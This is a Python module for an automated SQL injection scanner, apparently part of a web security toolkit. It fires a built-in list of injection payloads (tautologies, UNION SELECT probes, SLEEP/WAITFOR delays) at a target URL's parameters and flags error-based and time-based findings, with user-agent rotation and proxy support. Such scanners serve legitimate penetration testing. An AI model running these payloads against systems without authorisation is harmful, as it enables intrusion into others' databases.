import os
import time
import requests
import urllib.parse
import urllib3
from modules.utils import next_user_agent, make_proxies

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_PARAMS_WORDLIST = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'wordlists', 'sqli_params.txt')


def _load_params():
    try:
        with open(_PARAMS_WORDLIST, encoding='utf-8') as f:
            return [l.strip() for l in f if l.strip() and not l.startswith('#')]
    except FileNotFoundError:
        return ['id', 'q', 'search', 'user', 'category', 'page']

# Error-based SQLi detection strings per DB
ERROR_SIGNATURES = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "mysql_fetch",
    "mysql_num_rows",
    # MSSQL
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "unclosed quotation mark after the character string",
    "incorrect syntax near",
    # Oracle
    "ora-01756",
    "ora-00933",
    "ora-00907",
    "ora-00911",
    # PostgreSQL
    "pg_query",
    "psql error",
    "unterminated quoted string",
    # SQLite
    "sqlite_master",
    "sqliteexception",
    # Generic
    "sql syntax",
    "syntax error",
    "quoted string not properly terminated",
    "invalid query",
]

# Payloads to inject — tuples of (payload, expected_delay_seconds or None)
PAYLOADS = [
    ("'",                             None),
    ('"',                             None),
    ("' OR '1'='1",                   None),
    ("' OR '1'='1'--",                None),
    ("' OR 1=1--",                    None),
    ('\" OR \"1\"=\"1',               None),
    ("1' ORDER BY 1--",               None),
    ("1' ORDER BY 2--",               None),
    ("1' ORDER BY 3--",               None),
    ("' UNION SELECT NULL--",         None),
    ("' UNION SELECT NULL,NULL--",    None),
    ("'; WAITFOR DELAY '0:0:2'--",    2),
    ("'; SELECT SLEEP(2)--",          2),
    ("1 AND 1=1",                     None),
    ("1 AND 1=2",                     None),
    ("1' AND '1'='1",                 None),
    ("1' AND '1'='2",                 None),
]

_TIME_THRESHOLD = 1.5  # seconds over expected delay to count as confirmed


def _is_error_based(body):
    bl = body.lower()
    return next((sig for sig in ERROR_SIGNATURES if sig in bl), None)


def stream_scan_auto(target_url, method='GET', state=None, proxy=None, verify_ssl=False):
    """Test all parameter names from the sqli_params.txt wordlist."""
    params = _load_params()
    yield {'type': 'info', 'message': f'Auto-mode: testing {len(params)} parameters from sqli_params.txt...'}
    all_findings = []
    for param in params:
        yield {'type': 'param_start', 'param': param}
        for event in stream_scan(target_url, param, method=method, state=state,
                                 proxy=proxy, verify_ssl=verify_ssl, _quiet=True):
            if event['type'] == 'found':
                event['param'] = param
                all_findings.append(event)
                yield event
            elif event['type'] == 'error':
                yield event
                return
        if all_findings and all_findings[-1].get('param') == param:
            # Found something — keep going to collect all
            pass

    severity = 'none'
    if any(f.get('type') in ('Error-Based', 'Time-Based Blind') for f in all_findings):
        severity = 'high'
    elif all_findings:
        severity = 'medium'

    yield {
        'type': 'complete',
        'findings': all_findings,
        'total_tested': len(params),
        'severity': severity,
        'parameter': 'auto',
        'url': target_url,
    }


def stream_scan(target_url, param_name, method='GET', state=None,
                proxy=None, verify_ssl=False, _quiet=False):
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url

    if not _quiet:
        yield {'type': 'info', 'message': f'Target: {target_url}'}
        yield {'type': 'info', 'message': f'Parameter: {param_name}  |  Method: {method.upper()}'}
        yield {'type': 'info', 'message': f'Testing {len(PAYLOADS)} payloads...'}

    proxies = make_proxies(proxy) if proxy else None
    session = requests.Session()
    session.verify = verify_ssl
    if proxies:
        session.proxies = proxies

    # Baseline request to get original response length
    try:
        baseline_data = {param_name: 'test_baseline_value_xyz'}
        if method.upper() == 'POST':
            baseline = session.post(target_url, data=baseline_data, timeout=8,
                                    headers={'User-Agent': next_user_agent()})
        else:
            baseline = session.get(target_url, params=baseline_data, timeout=8,
                                   headers={'User-Agent': next_user_agent()})
        baseline_len = len(baseline.content)
        yield {'type': 'info', 'message': f'Baseline response: HTTP {baseline.status_code}, {baseline_len} bytes'}
    except Exception as e:
        yield {'type': 'error', 'message': f'Cannot reach target: {e}'}
        return

    findings = []
    total = len(PAYLOADS)

    for i, (payload, expected_delay) in enumerate(PAYLOADS):
        try:
            data = {param_name: payload}
            req_timeout = (expected_delay + 8) if expected_delay else 10
            t_start = time.monotonic()
            if method.upper() == 'POST':
                r = session.post(target_url, data=data, timeout=req_timeout,
                                 headers={'User-Agent': next_user_agent()})
            else:
                r = session.get(target_url, params=data, timeout=req_timeout,
                                headers={'User-Agent': next_user_agent()})
            elapsed = time.monotonic() - t_start

            body = r.text
            error_sig = _is_error_based(body)
            size_diff = abs(len(r.content) - baseline_len)

            vuln_type = None
            detail = ''

            if error_sig:
                vuln_type = 'Error-Based'
                detail = f'DB error signature: "{error_sig}"'
            elif expected_delay and elapsed >= expected_delay + _TIME_THRESHOLD:
                vuln_type = 'Time-Based Blind'
                detail = f'Response delayed {elapsed:.1f}s (expected ≥{expected_delay + _TIME_THRESHOLD:.1f}s for time-based injection)'
            elif r.status_code == 500 and baseline.status_code != 500:
                vuln_type = 'Possible (500 Error)'
                detail = 'Server returned 500 error only with injection payload'
            elif size_diff > 500 and "'" in payload:
                vuln_type = 'Possible (Response Diff)'
                detail = f'Response size differs by {size_diff} bytes with quote payload'

            if vuln_type:
                finding = {
                    'payload': payload,
                    'type': vuln_type,
                    'detail': detail,
                    'status': r.status_code,
                }
                findings.append(finding)
                yield {'type': 'found', **finding}

            if not _quiet and (i % 5 == 0 or i == total - 1):
                yield {
                    'type': 'progress',
                    'percent': int((i + 1) / total * 100),
                    'tried': i + 1,
                    'total': total,
                    'current': payload[:40]
                }

        except Exception as e:
            yield {'type': 'error', 'message': f'Request failed: {e}'}
            continue

    severity = 'none'
    if any(f['type'] in ('Error-Based', 'Time-Based Blind') for f in findings):
        severity = 'high'
    elif findings:
        severity = 'medium'

    if not _quiet:
        yield {
            'type': 'complete',
            'findings': findings,
            'total_tested': total,
            'severity': severity,
            'parameter': param_name,
            'url': target_url,
        }
